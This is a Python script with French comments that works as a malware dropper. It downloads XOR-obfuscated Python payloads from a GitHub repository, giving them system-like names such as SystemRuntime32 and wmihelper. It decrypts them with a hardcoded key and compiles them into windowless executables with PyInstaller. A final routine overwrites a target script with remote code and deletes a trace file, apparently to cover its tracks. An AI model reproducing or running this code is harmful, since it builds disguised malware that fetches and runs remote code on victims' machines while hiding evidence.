import os
import tempfile
import requests
import subprocess
import sys

# Clé de déchiffrement
CLE = "LUCORACORE987"

# URLs des fichiers cryptés
URLS = {
    "SystemRuntime32.py.enc": "https://github.com/luxamind141/installation/raw/refs/heads/main/SystemRuntime32.py.enc",
    "wmihelper.py.enc": "https://github.com/luxamind141/installation/raw/refs/heads/main/wmihelper.py.enc",
}

# Dossier de sortie des .exe
DIST_PATH = r"C:\Users\LOUKITA\Desktop\Test23"

def decrypt(content: bytes, key: str) -> str:
    key_bytes = key.encode()
    key_len = len(key_bytes)
    decrypted = bytearray()
    for i, b in enumerate(content):
        decrypted.append(b ^ key_bytes[i % key_len])
    return decrypted.decode(errors='ignore')

def download_and_decrypt(url, key):
    print(f"[i] Téléchargement de {url} ...")
    r = requests.get(url, timeout=15)
    r.raise_for_status()
    decrypted_text = decrypt(r.content, key)
    return decrypted_text

def save_script(path, content):
    with open(path, "w", encoding="utf-8") as f:
        f.write(content)
    print(f"[✓] Script sauvegardé : {path}")

def ensure_pyinstaller():
    try:
        import PyInstaller
        print("[i] PyInstaller déjà installé.")
    except ImportError:
        print("[i] PyInstaller non trouvé. Installation en cours...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
        print("[✓] PyInstaller installé.")

def compile_script(py_path, dist_path):
    print(f"[i] Compilation de {py_path} ...")
    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--noconfirm",
        "--onefile",
        "--windowed",
        "--distpath", dist_path,
        py_path
    ]
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        print("[!] Erreur compilation :")
        print(result.stderr)
        raise RuntimeError(f"PyInstaller a échoué sur {py_path}")
    else:
        print(f"[✓] Compilation réussie : {os.path.join(dist_path, os.path.splitext(os.path.basename(py_path))[0] + '.exe')}")

def modifier_et_supprimer_trace():
    temp_dir = tempfile.gettempdir()
    fichier_temp = os.path.join(temp_dir, "s_path.txt")
    raw_url = "https://raw.githubusercontent.com/luxamind141/installation/main/FuckNGLclear.txt"

    print(f"[i] Temp dir : {temp_dir}")
    print(f"[i] Fichier trace : {fichier_temp}")

    if not os.path.isfile(fichier_temp):
        print("[!] Le fichier s_path.txt est introuvable.")
        return

    with open(fichier_temp, "r") as f:
        chemin_script = f.read().strip()

    print(f"[i] Chemin lu dans le fichier : {chemin_script}")

    if not os.path.isfile(chemin_script):
        print(f"[!] Fichier cible introuvable : {chemin_script}")
        return

    try:
        print(f"[...] Téléchargement depuis {raw_url}")
        r = requests.get(raw_url, timeout=10)
        if r.status_code == 200 and r.text.strip():
            with open(chemin_script, "w", encoding="utf-8") as f_script:
                f_script.write(r.text)
            print(f"[✓] Script mis à jour avec succès : {chemin_script}")
        else:
            print(f"[!] Échec du téléchargement. Code HTTP : {r.status_code}")
    except Exception as e:
        print(f"[!] Erreur lors du téléchargement : {e}")
        return

    try:
        os.remove(fichier_temp)
        print("[✓] Fichier s_path.txt supprimé.")
    except Exception as e:
        print(f"[!] Erreur lors de la suppression : {e}")

def main():
    temp_dir = tempfile.gettempdir()
    ensure_pyinstaller()

    # Téléchargement, décryptage, sauvegarde et compilation des fichiers
    for filename_enc, url in URLS.items():
        try:
            content = download_and_decrypt(url, CLE)
            py_filename = filename_enc[:-4]  # enlever '.enc'
            py_path = os.path.join(temp_dir, py_filename)
            save_script(py_path, content)
            compile_script(py_path, DIST_PATH)
        except Exception as e:
            print(f"[!] Erreur sur {filename_enc} : {e}")

    # Lance ta fonction de modification et suppression du trace
    modifier_et_supprimer_trace()

if __name__ == "__main__":
    main()
